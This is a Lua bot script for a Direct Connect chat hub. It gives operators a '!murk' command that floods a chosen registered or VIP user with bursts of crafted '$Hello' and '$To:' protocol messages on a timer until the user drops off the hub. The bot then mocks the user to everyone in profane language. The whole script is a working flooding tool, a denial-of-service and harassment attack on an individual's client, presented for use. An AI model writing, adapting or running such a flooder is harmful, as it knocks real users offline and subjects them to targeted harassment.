sBotName = "¤Ñw-Mµ®kè®";

sFloodUser = nil;
iFloodCount = 10;

sToFloodUser = nil;

function Main()
	frmHub:RegBot(sBotName);
	SetTimer(10);
end

function OnTimer()
	for i = 2, 20, 1 do
		iFloodCount = iFloodCount + 2;
		SendToNick(sFloodUser, "$Hello Flooder"..iFloodCount..sToFloodUser..iFloodCount.." $ ")
	end

	if(GetItemByName(sFloodUser) == nil) then
		StopTimer();
		SendToAll(sBotName, sFloodUser.." was Murked "..iFloodCount.." times & then got kicked the fuck out.");
		iFloodCount = 0;
		sFloodUser,sToFloodUser = nil,nil;
	end
end

function ChatArrival(curUser, sData)
	local s, e, cmd, user = string.find(sData, "%b<> (%S+) (%S+)%|$");

	if(cmd == nil or curUser.bOperator == nil) then return 0; end

	cmd = string.lower(cmd);

	if(cmd == "!murk" and GetItemByName(user)) then
		local nick = GetItemByName(user)
		if nick.iProfile == 2 or nick.iProfile == 3 then
			sFloodUser = user;
			sToFloodUser = "|$To: "..sFloodUser.." From: Flooder";
			SendToAll(sBotName, "¤Ñw-Mµ®kè® ‡$ Mµ®kîñ "..user..". P®î¢k  .");
			StartTimer();
		else
			curUser:SendData(sBotName,"You can only flood REG or VIPs")
		end
		return 1
	end
end
